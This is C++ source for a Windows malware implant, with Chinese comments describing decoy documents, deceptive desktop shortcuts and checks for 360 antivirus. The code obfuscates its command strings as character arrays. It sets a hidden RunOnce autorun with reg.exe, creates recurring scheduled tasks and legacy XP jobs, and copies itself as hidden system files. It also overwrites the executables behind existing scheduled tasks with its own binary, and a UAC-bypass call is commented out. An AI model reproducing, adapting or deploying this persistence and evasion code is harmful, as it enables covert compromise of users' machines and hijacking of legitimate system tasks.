#include "api.h"
#include "BootStartup.h"
#include <lmcons.h>
#include <io.h>
#include <lmat.h>
#include <LMErr.h>
#include "AntiVirus.h"
#include "bootdesktop.h"
#include "function/interface.h"
#include "function/InstallApps.h"
#include "network/NetWorkdata.h"
#include "RegHelper.h"
#include "Config.h"
#include "initHelper.h"
#include "public.h"
#include "StrHelper.h"
#include "Utils.h"
#include "log.h"
#include "bootHelper.h"
#include "public.h"
#include "Parameter.h"
#include <iostream>

using namespace std;



//3种被启动状态:
//一 双击运行
//双击运行是由目标主动点击,可以肯定不在程序目标目录c:\users\username\appdata\services,可以挪过去直接运行
//需要的功能:
//1 打开需要打开的文档 
//2 复制到目标目录 
//3 检测360(如果存在的话释放图标,创建欺骗性的桌面快捷方式,指向释放的图标,如果360不存在直接写入启动项) 
//4 退出并从新目录启动程序

//二 快捷方式调用或者下载后被执行
//快捷方式可以肯定是第二次运行,不需要打开文件，不需要移动文件到目标目录，不需要设置启动项和释放图标
//以及设置桌面伪装快捷方式，不需要检测杀软的反应，但是需要打开指向的程序，需要检查伪装快捷方式指向的参数目标，打开相应的程序

//三 被下载执行
//下载执行可以肯定自己位于c:\users\appdata\username\services目录
//下载执行不需要打开文档，移动文件到目的目录（需要兼容？）,但是需要释放图标，检测杀软的反应


int setBoot(char* szSysDir, char* strPEResidence, int iSystemVersion)
{
	int iRet = 0;
	char szShowInfo[1024];

	int iArgc = 0;
	wchar_t** lpArgvW = lpCommandLineToArgvW(lpGetCommandLineW(), &iArgc);
	if (iArgc >= 2)
	{
		for (int i = 1; i < iArgc; i++) {
			char szParam[MAX_PATH] = { 0 };
			iRet = lpWideCharToMultiByte(CP_ACP, 0, lpArgvW[i], -1, szParam, MAX_PATH, NULL, NULL);

			if (lplstrcmpiA(szParam, "-p") == 0) {
				char szParam2[MAX_PATH] = { 0 };
				iRet = lpWideCharToMultiByte(CP_ACP, 0, lpArgvW[i+1], -1, szParam2, MAX_PATH, NULL, NULL);

				iRet = AppProxyStart(szParam2);
				break;
			}
			else if (lplstrcmpiA(szParam, "-f") == 0)
			{
				iRet = ReleaseFirstStart();
				break;
			}
			else if (lplstrcmpiA(szParam, "-s") == 0) {
				break;
			}
			else {
				ExitProcess(0);
			}
		}
	}
	else {
		iRet = ExplorerFirstStart();
	}

	BOOL exist = FALSE;
	gMutex = CheckInstanceExist(&exist);
	if (gMutex == 0 || (gMutex && exist))
	{
		lpReleaseMutex(gMutex);

		lpCloseHandle(gMutex);

		char szout[1024];
		wsprintfA(szout, "program has been already running with mutex:%x,to quit...\r\n", gMutex);
		writeLog(szout);

		lpExitProcess(0);
		return FALSE;
	}
	else {
		lpwsprintfA(szShowInfo,
			"username:%s,computername:%s,UacEnable:%u,ConsentPromptBehaviorAdmin:%u,PromptOnSecureDesktop:%u,iIsUserAdmin:%u,\
			iIsProcessAdmin:%u,iIsAdministrator:%u,ParentProcessName:%s\r\n", \
			strUserName, strComputerName, iEnableLUA, iConsentPromptBehaviorAdmin, iPromptOnSecureDesktop, iIsUserAdmin,
			iIsProcessAdmin, iIsAdministrator, szParentProcName);
		writeLog(szShowInfo);
	}

	char sz360Tray[] = { '3','6','0','T','r','a','y','.','e','x','e',0 };
	int b360Running = GetProcessIdByName(sz360Tray);
	if (b360Running)
	{
		HANDLE hThreadLnkProc = lpCreateThread(0, 0, (LPTHREAD_START_ROUTINE)snoop360snooze, 0, 0, 0);
		lpCloseHandle(hThreadLnkProc);
	}

	return TRUE;
}






int replaceTask() {

	string oldtaskspath = string(strDataPath) + "oldtasks.txt";
	string querycmd = string("cmd /c SCHTASKS /FO list /V > ") + oldtaskspath;
	int iret = WinExec(querycmd.c_str(), SW_HIDE);

	Sleep(6000);

	HANDLE h = CreateFileA(oldtaskspath.c_str(), GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (h == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	int filesize = GetFileSize(h, 0);
	char* data = new char[filesize + 0x1000];

	DWORD readcnt = 0;
	iret = ReadFile(h, data, filesize, &readcnt, 0);
	CloseHandle(h);
	//DeleteFileA(oldtaskspath.c_str());
	if (readcnt <= 0 || filesize != readcnt)
	{
		return FALSE;
	}

	*(data + filesize) = 0;

	char* hdrflag = "要运行的任务:";
	int hdrflaglen = lstrlenA(hdrflag);

	char* hdr = data;
	do
	{

		char* cmdline = strstr(hdr, hdrflag);
		if (cmdline <= 0)
		{
			delete data;
			break;
		}

		cmdline += hdrflaglen;

		hdr = cmdline;

		char tmpfilepath[MAX_PATH] = { 0 };
		int srcoffset = 0;
		int dstoffset = 0;
		while (1)
		{
			if (cmdline[srcoffset] == 0x0d || cmdline[srcoffset + 1] == 0x0a)
			{
				break;
			}

			tmpfilepath[dstoffset] = cmdline[srcoffset];
			dstoffset++;

			srcoffset++;
		}

		delete data;

		string str = tmpfilepath;

		string::size_type pos = str.find_first_not_of(' ');
		if (pos != string::npos)
		{
			string::size_type pos2 = str.find_last_not_of(' ');
			if (pos2 != string::npos)
			{
				str = str.substr(pos, pos2 - pos + 1);
			}
		}

		pos = str.find_first_not_of('"');	//0x22
		if (pos != string::npos)
		{
			string::size_type pos2 = str.find_last_not_of('"');
			if (pos2 != string::npos)
			{
				str = str.substr(pos, pos2 - pos + 1);
			}
		}

		pos = str.find(" /");
		if (pos != string::npos)
		{
			str = str.substr(0, pos);
		}

		//char szfilename[MAX_PATH] = { 0 };
		//GetNameFromFullName((char*)str.c_str(), szfilename);
		char szcurexe[MAX_PATH] = { 0 };
		iret = GetModuleFileNameA(0, szcurexe, MAX_PATH);
		iret = CopyFileA(szcurexe, str.c_str(), 0);

		char szpath[MAX_PATH] = { 0 };
		iret = GetPathFromFullName((char*)str.c_str(), szpath);
		if (strstr(szpath, "system32") == 0 && strstr(szpath, "%windir%") == 0 && strstr(szpath, "windows") == 0 && strstr(szpath, "SysWOW64") == 0)
		{
			char szdllname[MAX_DLL_COUNT][MAX_PATH];
			DWORD dllcnt = 0;
			iret = backHome(szpath, strDataPath, szdllname, &dllcnt);

			return TRUE;
		}

	} while (TRUE);

	return FALSE;
}



DWORD BackupProgram(char* szSrcFile, char szDllName[MAX_DLL_COUNT][MAX_PATH], DWORD dwDllCnt,
	char* szSysDir, char* strUserName, char* strBakPEResidence)
{
	char szShowInfo[1024];

	char szPeSuffixExe[] = { 'e','x','e',0 };
	char szPeSuffixCom[] = { 'c','o','m',0 };
	char szPeSuffixScr[] = { 's','c','r',0 };
	char szPeSuffixLnk[] = { 'l','n','k',0 };
	char szPeSuffixBat[] = { 'b','a','t',0 };
	int iRet = 0;

	char szDstExeNameFormatWin7[] = { 'c',':','\\','u','s','e','r','s','\\','%','s','\\','D','o','c','u','m','e','n','t','s','\\','%','s',0 };
	char szDstExeNameFormat[] = { 'C',':',0x5c,'D','o','c','u','m','e','n','t','s',' ','a','n','d',' ','S','e','t','t','i','n','g','s',\
		0x5c,'%','s',0x5c,'M','y',' ','D','o','c','u','m','e','n','t','s',0x5c,'%','s',0 };
	szDstExeNameFormatWin7[0] = szSysDir[0];
	szDstExeNameFormat[0] = szSysDir[0];
	char szDstFilePathFormat[MAX_PATH] = { 0 };
	if (iSystemVersion > SYSTEM_VERSION_XP)
	{
		lplstrcpyA(szDstFilePathFormat, szDstExeNameFormatWin7);
	}
	else
	{
		lplstrcpyA(szDstFilePathFormat, szDstExeNameFormat);
	}


	char szExeName[MAX_PATH] = { 0 };
	lplstrcpyA(szExeName, szSrcFile);
	pPathStripPathA(szExeName);

	char szDstExeName[MAX_PATH] = { 0 };
	lpwsprintfA(szDstExeName, szDstFilePathFormat, strUserName, szExeName);
	lplstrcpyA(strBakPEResidence, szDstExeName);

	//char szCurrentPath[MAX_PATH];
	//iRet = lpGetModuleFileNameA(0,szCurrentPath,MAX_PATH);
	iRet = lpCopyFileA(szSrcFile, szDstExeName, 0);
	if (iRet == 0)
	{
		iRet = lpRtlGetLastWin32Error();

		lpwsprintfA(szShowInfo, "BackupProgram lpCopyFileA error,the src file is:%s,the dst file is:%s,the errorcode is:%u\r\n",
			szSrcFile, szDstExeName, iRet);
		writeLog(szShowInfo);
	}
	else
	{
		iRet = lpSetFileAttributesA(szDstExeName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);
	}

	for (DWORD i = 0; i < dwDllCnt; i++)
	{
		char szDstDllName[MAX_PATH] = { 0 };
		char szTmpDllName[MAX_PATH] = { 0 };
		lplstrcpyA(szTmpDllName, szDllName[i]);
		pPathStripPathA(szTmpDllName);
		lpwsprintfA(szDstDllName, szDstFilePathFormat, strUserName, szTmpDllName);
		iRet = lpCopyFileA(szDllName[i], szDstDllName, 0);
		if (iRet == 0)
		{
			iRet = lpRtlGetLastWin32Error();
			lpwsprintfA(szShowInfo, "BackupProgram lpCopyFileA dll error,the src file is:%s,the dst file is:%s,the errorcode is:%u\r\n",
				szDllName[i], szDstDllName, iRet);
			writeLog(szShowInfo);
		}
		else
		{
			iRet = lpSetFileAttributesA(szDstDllName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_SYSTEM);

		}
	}

	//regqueryvalueex 2:Registry symbolic links should only be used for for application compatibility when absolutely necessary. 
	char szSubKey[] = { 'S','o','f','t','w','a','r','e',0x5c,'M','i','c','r','o','s','o','f','t',0x5c,
		'W','i','n','d','o','w','s',0x5c,'C','u','r','r','e','n','t','V','e','r','s','i','o','n',0x5c,'R','u','n','O','n','c','e',0x5c,0 };
	char szKeyNameAutoRun[] = { 'S','y','s','t','e','m','S','e','r','v','i','c','e','A','u','t','o','R','u','n',0 };
	char szRegFullPath[MAX_PATH];
	char szRegFullPathFormat[] = { '%','s','\\','r','e','g','.','e','x','e',0 };
	lpwsprintfA(szRegFullPath, szRegFullPathFormat, szSysDir);

	// 	lpwsprintfA(szParam,"query hkcu\\%s",szRegRunOnce);
	// 	iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam);

	//here as command schtasks /create command,do not user 2 "" to cover the command
	//not user " " to include the param in reg when execute it,it can not recognize it
	char szParam[MAX_PATH];
	char szParamFormat[] = { 'a','d','d',' ','h','k','c','u','\\','%','s',' ','/','v',' ','%','s',' ','/','t',' ','r','e','g','_','s','z',' ','/','d',' ','\"','%','s','\"',0 };
	//add hkcu\\%s /v %s /t reg_sz /d %s
	lpwsprintfA(szParam, szParamFormat, szSubKey, szKeyNameAutoRun, szDstExeName);
	char szCmd[MAX_PATH];
	char szCmdFormat[] = { 'c','m','d',' ','/','c',' ','%','s',' ','%','s',0 };
	lpwsprintfA(szCmd, szCmdFormat, szRegFullPath, szParam);
	unsigned char szKeyValue[MAX_PATH] = { 0 };
	int valuelen = MAX_PATH;
	iRet = QueryRegistryValue(HKEY_CURRENT_USER, szSubKey, szKeyNameAutoRun, szKeyValue, &valuelen);
	if (iRet)
	{
		if (strstr((char*)szKeyValue, szDstExeName) == 0)
		{
			iRet = lpWinExec(szCmd, SW_HIDE);
			//iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam,UACBYPASS_CMD_TYPE_RUNCMD);
		}
		else {

		}
	}
	else
	{
		iRet = lpWinExec(szCmd, SW_HIDE);
		//iRet = BypassUacRegistry(szRegFullPath,BypassUacWithRegistryEventVwr,szParam,UACBYPASS_CMD_TYPE_RUNCMD);
	}

	lpwsprintfA(szShowInfo, "BackupProgram execute reg add command:%s\r\n", szCmd);
	writeLog(szShowInfo);

	return TRUE;
}











DWORD CreateSchWinXP(int iInterval, char* szTaskName, char* szPeFileName)
{
	char szShowInfo[1024];
	char szCmd[MAX_PATH];
	// 	char szScheduleCmd[] = {'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
	// 		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','s','y','s','t','e','m',0};

	char szScheduleCmd[] = { 'c','m','d',' ','/','c',' ','%','s','\\',
		'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
		'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','%','s',0 };

	char szAccountName[MAX_PATH];
	int iRet = lpwsprintfA(szAccountName, "%s\\%s", strComputerName, strUserName);
	//task account must be computer/user
	iRet = lpwsprintfA(szCmd, szScheduleCmd, szSysDir, iInterval, szTaskName, szPeFileName, szAccountName);

	iRet = lpWinExec(szCmd, SW_HIDE);
	if (iRet <= 31)
	{
		iRet = lpRtlGetLastWin32Error();
		char szShowInfo[512];
		lpwsprintfA(szShowInfo, "CreateScheduleInCmd lpWinExec create error,the errorcode is:%u\r\n", iRet);
		writeLog(szShowInfo);
		return FALSE;
	}

	//schtasks /change command need adin account and password,so here will be a failure result
	char szScheduleChange[] = { 'c','m','d',' ','/','c',' ','%','s','\\','s','c','h','t','a','s','k','s',' ','/','c','h','a','n','g','e',' ',
		'/','t','n',' ','%','s',' ','/','r','l',' ','h','i','g','h','e','s','t',0 };
	iRet = lpwsprintfA(szCmd, szScheduleChange, szSysDir, szTaskName);
	iRet = lpWinExec(szCmd, SW_HIDE);
	if (iRet <= 31)
	{
		iRet = lpRtlGetLastWin32Error();

		lpwsprintfA(szShowInfo, "CreateScheduleInCmd lpWinExec change error,the errorcode is:%u\r\n", iRet);
		writeLog(szShowInfo);
		return FALSE;
	}

	writeLog("windowxp create schedule ok\r\n");
	return TRUE;
}




//SCHTASKS /CREATE /SC MINUTE /MO 1 /TN ACCOUNTANT /TR CALC.EXE /ST 00:00 /ET 23:59 /SD 2017/02/14 /ED 2017/02/15
//C:\Windows\System32\Tasks
// the URI is the relative path to root path:"C:\Windows\System32\Tasks"
int createBootTask(int iInterval, char* szTaskName, char* szPeFileName, char* param, int iSystemVersion)
{
	char szShowInfo[1024];

	//win7 win8 all the trigger is false or true will be both ok
	char szTaskXmlFileForamt[] =
	{ "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n"
	"<Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n"
	"<RegistrationInfo>\r\n"
	"<Version>1.0.0.0</Version>\r\n"
	"<Description>update</Description>\r\n"
	"<Date>%s</Date>\r\n"
	"<Author>%s</Author>\r\n"
	"</RegistrationInfo>\r\n"
	"<Triggers>\r\n"
	"<TimeTrigger>\r\n"
	"<Repetition>\r\n"
	"<Interval>PT%uM</Interval>\r\n"
	"<StopAtDurationEnd>false</StopAtDurationEnd>\r\n"
	"</Repetition>\r\n"
	"<StartBoundary>%s</StartBoundary>\r\n"
	"<Enabled>true</Enabled>\r\n"
	"</TimeTrigger>\r\n"
	"</Triggers>\r\n"
	"<Principals>\r\n"
	"<Principal id=\"Author\">\r\n"
	"<RunLevel>LeastPrivilege</RunLevel>\r\n"			//HighestAvailable LeastPrivilege
	"<UserId>%s</UserId>\r\n"
	"<LogonType>InteractiveToken</LogonType>\r\n"
	"</Principal>\r\n"
	"</Principals>\r\n"
	"<Settings>\r\n"
	"<MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n"
	"<DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n"
	"<StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n"
	"<AllowHardTerminate>false</AllowHardTerminate>\r\n"
	"<StartWhenAvailable>false</StartWhenAvailable>\r\n"
	"<RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n"
	"<IdleSettings>\r\n"
	"<StopOnIdleEnd>false</StopOnIdleEnd>\r\n"
	"<RestartOnIdle>false</RestartOnIdle>\r\n"
	"</IdleSettings>\r\n"
	"<AllowStartOnDemand>false</AllowStartOnDemand>\r\n"
	"<Enabled>true</Enabled>\r\n"
	"<Hidden>false</Hidden>\r\n"
	"<RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n"
	"<WakeToRun>false</WakeToRun>\r\n"
	"<ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n"
	"<Priority>7</Priority>\r\n"
	"</Settings>\r\n"
	"<Actions Context=\"Author\">\r\n"
	"<Exec>\r\n"
	"<Command>%s</Command>\r\n"
	"<Arguments>%s</Arguments>\r\n"
	"</Exec>\r\n"
	"</Actions>\r\n"
	"</Task>\r\n" };

	//LeastPrivilege
	//HighestAvailable

	char szTaskXmlFileForamtWin10[] =
	{ "<?xml version=\"1.0\" encoding=\"UTF-16\"?>\r\n\
	 <Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\">\r\n\
	 <RegistrationInfo>\r\n\
	 <Version>1.0.0.0</Version>\r\n\
     <Description>update</Description>\r\n\
	 <Date>%s</Date>\r\n\
	 <Author>%s</Author>\r\n\
	 <URI>\\%s</URI>\r\n\
	 </RegistrationInfo>\r\n\
	 <Triggers>\r\n\
	 <TimeTrigger>\r\n\
	 <Repetition>\r\n\
	 <Interval>PT%uM</Interval>\r\n\
	 <StopAtDurationEnd>false</StopAtDurationEnd>\r\n\
	 </Repetition>\r\n\
	 <StartBoundary>%s</StartBoundary>\r\n\
	 <Enabled>true</Enabled>\r\n\
	 </TimeTrigger>\r\n\
	 </Triggers>\r\n\
	 <Principals>\r\n\
	 <Principal id=\"Author\">\r\n\
	 <RunLevel>LeastPrivilege</RunLevel>\r\n\
	 <UserId>%s</UserId>\r\n\
	 <LogonType>InteractiveToken</LogonType>\r\n\
	 </Principal>\r\n\
	 </Principals>\r\n\
	 <Settings>\r\n\
	 <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>\r\n\
	 <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>\r\n\
	 <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>\r\n\
	 <AllowHardTerminate>false</AllowHardTerminate>\r\n\
	 <StartWhenAvailable>false</StartWhenAvailable>\r\n\
	 <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>\r\n\
	 <IdleSettings>\r\n\
	 <StopOnIdleEnd>false</StopOnIdleEnd>\r\n\
	 <RestartOnIdle>false</RestartOnIdle>\r\n\
	 </IdleSettings>\r\n\
	 <AllowStartOnDemand>false</AllowStartOnDemand>\r\n\
	 <Enabled>true</Enabled>\r\n\
	 <Hidden>false</Hidden>\r\n\
	 <RunOnlyIfIdle>false</RunOnlyIfIdle>\r\n\
	 <WakeToRun>false</WakeToRun>\r\n\
	 <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>\r\n\
	 <Priority>7</Priority>\r\n\
	 </Settings>\r\n\
	 <Actions Context=\"Author\">\r\n\
	 <Exec>\r\n\
	 <Command>%s</Command>\r\n\
	 <Arguments>%s</Arguments>\r\n\
	 </Exec>\r\n\
	 </Actions>\r\n\
	 </Task>\r\n" };


	char strUserName[64];
	DWORD dwSize = sizeof(strUserName);
	int iRet = lpGetUserNameA(strUserName, &dwSize);


	char strComputerName[64];
	dwSize = sizeof(strComputerName);
	iRet = lpGetComputerNameA(strComputerName, &dwSize);

	char szSysDir[MAX_PATH];
	iRet = GetSystemDirectoryA(szSysDir, MAX_PATH);

	SYSTEMTIME stTime = { 0 };
	lpGetLocalTime(&stTime);

	char szTime[MAX_PATH];
	char szTimeFormat[] = "%04u-%02u-%02uT%02u:%02u:%02u";
	lpwsprintfA(szTime, szTimeFormat, stTime.wYear, stTime.wMonth, stTime.wDay, stTime.wHour, stTime.wMinute, stTime.wSecond);

	char szAccountName[MAX_PATH];
	iRet = lpwsprintfA(szAccountName, "%s\\%s", strComputerName, strUserName);
	//lstrcpyA(szAccountName,"system");

	char szTaskFileBuf[SCHTASK_FILE_SIZE];

	int iLen = 0;
	if (iSystemVersion >= SYSTEM_VERSION_WIN10)
	{
		iLen = sprintf_s(szTaskFileBuf, SCHTASK_FILE_SIZE, szTaskXmlFileForamtWin10, szTime, strUserName, szTaskName, iInterval, szTime, strUserName,
			szPeFileName, param);
	}
	else
	{
		iLen = sprintf_s(szTaskFileBuf, SCHTASK_FILE_SIZE, szTaskXmlFileForamt, szTime, strUserName, iInterval, szTime, szAccountName,
			szPeFileName, param);
	}

	char szTaskXmlFile[MAX_PATH];
	makeFullFileName(szTaskXmlFile, TASKS_XML_FILE_NAME);
	HANDLE hFileTask = lpCreateFileA(szTaskXmlFile, GENERIC_WRITE, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	if (hFileTask == INVALID_HANDLE_VALUE)
	{
		writeLog("CreateScheduleInCmd lpCreateFileA error\r\n");
		return FALSE;
	}
	DWORD dwCnt = 0;
	int iRes = lpWriteFile(hFileTask, szTaskFileBuf, iLen, &dwCnt, 0);
	lpCloseHandle(hFileTask);
	if (iRes == FALSE)
	{
		writeLog("CreateScheduleInCmd lpWriteFile error\r\n");
		return FALSE;
	}

	char szScheduleCmdFormat[] =
	{ 'c','m','d',' ','/','c',' ','%','s','\\','S','C','H','T','A','S','K','S','.','e','x','e',' ','/','C','R','E','A','T','E',' ','/','F',' ',
		'/','T','N',' ','%','s',' ','/','x','m','l',' ','%','s',/*' ','>','>','%','s',*/0 };
	char szCmd[1024];
	iLen = lpwsprintfA(szCmd, szScheduleCmdFormat, szSysDir, szTaskName, szTaskXmlFile/*,szCmdOutputFile*/);
	//the function below will cause uac protection!
	//ShellExecuteA(0,"runas","c:\\windows\\system32\\schtasks.exe",
	//"/create /f /tn wioserver /xml c:\\users\\liujinguang\\appdata\\local\temp\\mylittlebear\\task_xml_file.txt",0,SW_HIDE);
	iRet = lpWinExec(szCmd, SW_HIDE);
	if (iRet <= 31)
	{
		iRet = lpRtlGetLastWin32Error();
		lpwsprintfA(szShowInfo, "CreateScheduleInCmd lpWinExec create error,the errorcode is:%u\r\n", iRet);
		writeLog(szShowInfo);
	}

	lpwsprintfA(szShowInfo, "run command to create task schedule:%s\r\n", szCmd);
	writeLog(szShowInfo);


	// 	//can not delete it here,i dont know why
	// 	#ifndef _DEBUG
	// 	iRet = lpDeleteFileA(szTaskXmlFile);
	// 	#endif

	// 		char szCmd[MAX_PATH];
	// 		char szScheduleCmd[] = {'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
	// 			'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ','s','y','s','t','e','m',0};
	// 		char szScheduleCmd[] = {'c','m','d',' ','/','c',' ',
	// 			'S','C','H','T','A','S','K','S',' ','/','C','R','E','A','T','E',' ','/','F',' ','/','S','C',' ','M','I','N','U','T','E',' ',
	// 			'/','M','O',' ','%','u',' ','/','T','N',' ','%','s',' ','/','T','R',' ','%','s',' ','/','r','u',' ',
	// 			'%','s',0};
	// 	task account must be computer/user
	// 		iRet = lpwsprintfA(szCmd,szScheduleCmd,iInterval,szTaskName,szPeFileName,szAccountName);

	// 	schtasks /change command need admin account and password,so here will be a failure result
	// 		char szScheduleChange[] = {'c','m','d',' ','/','c',' ','s','c','h','t','a','s','k','s',' ','/','c','h','a','n','g','e',' ',
	// 			'/','t','n',' ','%','s',' ','/','r','l',' ','h','i','g','h','e','s','t',0};
	// 		iRet = lpwsprintfA(szCmd,szScheduleChange,szTaskName);
	// 		iRet = lpWinExec(szCmd,SW_HIDE);

	return TRUE;
}



int windowsXPJob(DWORD dwStartMilliSeconds, DWORD dwTimes)
{
	char szShowInfo[1024];

	char szStartAtFormat[] = { 'c','m','d',' ','/','c',' ','%','s','\\','n','e','t',' ','s','t','a','r','t',' ','s','c','h','e','d','u','l','e',0 };
	char szStartAt[MAX_PATH];
	char szSysDir[MAX_PATH] = { 0 };
	lpGetSystemDirectoryA(szSysDir, MAX_PATH);
	lpwsprintfA(szStartAt, szStartAtFormat, szSysDir);
	int iRet = lpWinExec(szStartAt, SW_HIDE);

	AT_INFO ai = { 0 };

	WCHAR szFilePath[MAX_PATH] = { 0 };
	int iLen = lpMultiByteToWideChar(CP_ACP, 0, strPEResidence, lplstrlenA(strPEResidence), szFilePath, sizeof(szFilePath));

	DWORD dwMilliSeconds = dwStartMilliSeconds;
	for (DWORD i = 0; i < dwTimes; i++)
	{
		ai.Command = szFilePath;
		ai.DaysOfMonth = 0;
		ai.DaysOfWeek = 0x7F;
		ai.Flags = JOB_RUN_PERIODICALLY;
		ai.JobTime = dwMilliSeconds;
		DWORD JobId;

		iRet = lpNetScheduleJobAddW(NULL, LPBYTE(&ai), &JobId);
		if (iRet != NERR_Success)
		{

			lpwsprintfA(szShowInfo, "set job no:%u error at time:%u\r\n", i, dwMilliSeconds);
			writeLog(szShowInfo);
			return FALSE;
		}
		else
		{
			lpwsprintfA(szShowInfo, "set job no:%u ok at time:%u\r\n", i, dwMilliSeconds);
			writeLog(szShowInfo);
		}

		dwMilliSeconds = dwMilliSeconds + 24 * 60 * 60 * 1000 / dwTimes;
	}

	//	ai.JobTime = 20 * 60 * 60 * 1000 + 5 * 60 * 1000; 
	// 	DWORD JobId;
	// 	iRet  = lpNetScheduleJobAddW(NULL, LPBYTE(&ai), &JobId);
	// 	if (iRet !=  NERR_Success )
	// 	{
	// 
	// 		return FALSE;
	// 	}
	return TRUE;
}


